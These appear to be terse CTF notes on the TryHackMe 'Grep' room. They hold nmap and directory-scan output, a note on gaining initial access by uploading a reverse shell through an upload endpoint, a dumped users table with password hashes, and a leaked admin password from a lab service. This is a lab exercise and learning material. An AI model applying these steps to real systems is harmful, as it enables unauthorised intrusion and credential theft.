<code>

┌──(duke㉿kali)-[~/Documents/THM_Grep]
└─$ nmap  -sV -Pn -p-  10.10.133.182
Starting Nmap 7.92 ( https://nmap.org ) at 2024-06-18 04:20 CDT
Nmap scan report for 10.10.133.182
Host is up (0.036s latency).
Not shown: 65531 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http     Apache httpd 2.4.41 ((Ubuntu))
443/tcp   open  ssl/http Apache httpd 2.4.41
51337/tcp open  http     Apache httpd 2.4.41
Service Info: Host: ip-10-10-133-182.eu-west-1.compute.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.63 seconds



/public               (Status: 301) [Size: 307] [--> https://grep.thm/public/]
/api                  (Status: 301) [Size: 304] [--> https://grep.thm/api/]   
/javascript           (Status: 301) [Size: 311] [--> https://grep.thm/javascript/]
/phpmyadmin           (Status: 403) [Size: 274]                                   
/server-status        (Status: 403) [Size: 274] 


[+] Url:                     https://grep.thm/public
/index.php            (Status: 200) [Size: 0]
/html                 (Status: 301) [Size: 312] [--> https://grep.thm/public/html/]
/css                  (Status: 301) [Size: 311] [--> https://grep.thm/public/css/] 
/js                   (Status: 301) [Size: 310] [--> https://grep.thm/public/js/] 


[+] Url:                     https://grep.thm/api
/index.php            (Status: 200) [Size: 0]
/login.php            (Status: 200) [Size: 34]
/register.php         (Status: 200) [Size: 38]
/uploads              (Status: 301) [Size: 312] [--> https://grep.thm/api/uploads/]
/upload.php           (Status: 200) [Size: 39]                                     
/posts.php            (Status: 200) [Size: 25]                                     
/logout.php           (Status: 200) [Size: 42]                                     
/config.php           (Status: 200) [Size: 0]   

[+] Url:                     https://grep.thm/javascript
/jquery               (Status: 301) [Size: 318] [--> https://grep.thm/javascript/jquery/]

johncena

### Initial access over https://grep.thm/api/upload.php upload revershell


in /var/www/backup/users.sql
INSERT INTO `users` (`id`, `username`, `password`, `email`, `name`, `role`) VALUES
(1, 'test', '$2y$10$dE6VAdZJCN4repNAFdsO2ePDr3StRdOhUJ1O/41XVQg91qBEBQU3G', 'test@grep.thm', 'Test User', 'user'),
(2, 'admin', '$2y$10$3V62f66VxzdTzqXF4WHJI.Mpgcaj3WxwYsh7YDPyv1xIPss4qCT9C', 'admin@searchme2023cms.grep.thm', 'Admin User', 'admin');

www-data@ip-10-10-63-206:/var/www$ ls -la
ls -la
total 48
drwxr-xr-x  6 ubuntu www-data 4096 Jun 14  2023 .
drwxr-xr-x 14 root   root     4096 Nov 10  2021 ..
drwxr-xr-x  2 ubuntu www-data 4096 Jun 14  2023 backup
-rw-r--r--  1 root   root     1131 Jun 14  2023 certificate.crt
-rw-r--r--  1 root   root      960 Jun  2  2023 certificate.csr
drwxr-xr-x  2 ubuntu www-data 4096 Jun 14  2023 default_html
drwxr-xr-x  4 ubuntu www-data 4096 Jun  7  2023 html
-rw-r--r--  1 root   root     1208 Jun 14  2023 leak_certificate.crt
-rw-r--r--  1 root   root     1001 Jun 14  2023 leak_certificate.csr
drwxr-xr-x  2 ubuntu www-data 4096 Jun 14  2023 leakchecker
-rw-------  1 root   root     1874 Jun  2  2023 private.key
-rw-------  1 root   root     1704 Jun 14  2023 private_unencrypted.key

###  https://leakchecker.grep.thm:51337/?email=admin%40searchme2023cms.grep.thm
get password

Password: admin_tryhackme! 
  
</code>
